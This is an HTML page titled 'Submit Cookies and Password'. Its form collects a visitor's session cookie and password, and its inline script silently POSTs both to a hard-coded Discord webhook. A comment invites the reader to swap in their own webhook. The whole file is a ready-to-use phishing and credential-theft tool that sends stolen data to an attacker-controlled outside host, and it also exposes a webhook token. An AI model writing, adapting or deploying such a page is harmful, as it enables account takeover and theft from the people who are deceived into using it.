<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit Cookies and Password</title>
</head>
<body>
    <h2>Enter Your Cookie and Password</h2>
    <form id="dataForm">
        <label for="cookie">Cookie:</label>
        <input type="text" id="cookie" name="cookie" required><br><br>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>

        <button type="submit">Submit</button>
    </form>

    <script>
        document.getElementById('dataForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const cookie = document.getElementById('cookie').value;
            const password = document.getElementById('password').value;
            
            const webhookURL = 'https://discord.com/api/webhooks/1357337114748129342/x-pyGxpex3twlgDjR2AnvFbR6O9piz0ASpe1Golwzf5pg8oTRiE1hBPcw_K3p4h--fRE'; // Replace with your Discord webhook URL
            
            const payload = {
                content: `Cookie: ${cookie}\nPassword: ${password}`
            };
            
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                alert('Data sent successfully!');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred.');
            });
        });
    </script>
</body>
</html>
